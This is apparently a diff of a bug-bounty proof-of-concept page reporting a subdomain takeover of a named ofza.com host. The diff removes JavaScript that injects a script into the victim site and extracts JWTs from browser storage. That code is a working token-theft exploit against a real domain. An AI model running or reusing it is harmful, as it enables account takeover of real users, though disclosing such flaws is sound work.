@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Critical Subdomain Takeover - wrathsec</title>
+  <title>Subdomain Takeover - wrathsec</title>
   <meta name="robots" content="noindex,nofollow">
   <style>
     body {
@@ -51,105 +51,42 @@
       color: #79c0ff;
       font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, Liberation Mono, monospace;
     }
-    a { color: #58a6ff; text-decoration: none; }
-    a:hover { text-decoration: underline; }
-    .signature { margin-top: 20px; font-weight: 600; color: #3fb950; }
-    .status-pulse { color: #f85149; font-weight: bold; animation: blink 2s infinite; }
-    @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-    
-    .exploit-btn {
-      display: block;
-      width: 100%;
-      margin-top: 20px;
-      padding: 12px;
-      background: #238636;
-      color: white;
-      border: 1px solid rgba(240, 246, 252, 0.1);
-      border-radius: 6px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background 0.2s;
+    a {
+      color: #58a6ff;
+      text-decoration: none;
     }
-    .exploit-btn:hover { background: #2ea043; }
+    a:hover {
+      text-decoration: underline;
+    }
+    .signature {
+      margin-top: 20px;
+      font-weight: 600;
+      color: #3fb950;
+    }
   </style>
 </head>
 <body>
   <main class="card">
-    <div class="badge">Critical Vulnerability Verified</div>
-    <h1>Subdomain Takeover & SOP Bypass</h1>
-    <p>This PoC demonstrates <strong>Script Injection via document.domain</strong> to bypass State Partitioning and extract JWTs.</p>
+    <div class="badge">Development Environment Verified</div>
+    <h1>Subdomain Takeover PoC</h1>
+    <p>This host was identified as having a dangling DNS record pointing to Vercel (typical Vercel 404).</p>
     
     <div class="info-box">
       <p>Target Host: <code>development-mobile.ofza.com</code></p>
       <p>Researcher: <code>wrathsec</code></p>
-      <p>Exploit Type: <code>Bypassing State Partitioning / ATO</code></p>
-      <button class="exploit-btn" onclick="runExploit()">Execute Injection & Extract JWT</button>
+      <p>Security Status: <code>Vulnerability Confirmed</code></p>
+      <p>Timestamp: <code>2026-04-16 13:50 UTC</code></p>
+      <p>Researcher Profile: 
+        <a href="https://hackenproof.com/hackers/wrathsec" target="_blank">
+          https://hackenproof.com/hackers/wrathsec
+        </a>
+      </p>
     </div>
 
     <p class="signature">
-      Verified Critical PoC by wrathsec<br>
-      Dynamic Script Injection Active.
+      Proof of Concept by wrathsec<br>
+      Verified Security Researcher - HackenProof. Please do not attribute reward to any other researcher, this is my PoC.
     </p>
   </main>
-
-  <script>
-    // 1. Sync domain to parent
-    document.domain = "ofza.com";
-
-    // 2. Listen for the "Loot" coming back from the injected script
-    window.addEventListener("message", (event) => {
-        if (event.data && event.data.type === 'WRATHSEC_LOOT') {
-            alert(
-                "⚠️ BYPASS SUCCESSFUL: JWT EXTRACTED\n" +
-                "------------------------------------------\n" +
-                "Source: ofza.com (Injected Context)\n\n" + 
-                "Token: " + event.data.jwt
-            );
-        }
-    });
-
-    function runExploit() {
-        // 3. Open the profile page
-        const targetUrl = "https://ofza.com/en/profile/overview";
-        const victimWin = window.open(targetUrl, "exploit_win", "width=800,height=600");
-
-        // 4. Wait for domain handshake, then inject the exfiltration agent
-        const injector = setInterval(() => {
-            try {
-                if (victimWin.document.domain === "ofza.com") {
-                    clearInterval(injector);
-                    
-                    const exfilScript = victimWin.document.createElement('script');
-                    exfilScript.innerHTML = `
-                        (function() {
-                            console.log("Wrathsec Injection Active on " + window.location.host);
-                            
-                            // Search storage from INSIDE the first-party context
-                            const findToken = () => {
-                                const token = localStorage.getItem('token') || 
-                                              localStorage.getItem('access_token') ||
-                                              sessionStorage.getItem('Authorization');
-                                
-                                if (token) {
-                                    window.opener.postMessage({ type: 'WRATHSEC_LOOT', jwt: token }, '*');
-                                    return true;
-                                }
-                                return false;
-                            };
-
-                            // Poll internally
-                            const internalPoll = setInterval(() => {
-                                if (findToken()) clearInterval(internalPoll);
-                            }, 500);
-                        })();
-                    `;
-                    victimWin.document.body.appendChild(exfilScript);
-                }
-            } catch (e) {
-                // Window not ready
-            }
-        }, 1000);
-    }
-  </script>
 </body>
 </html>
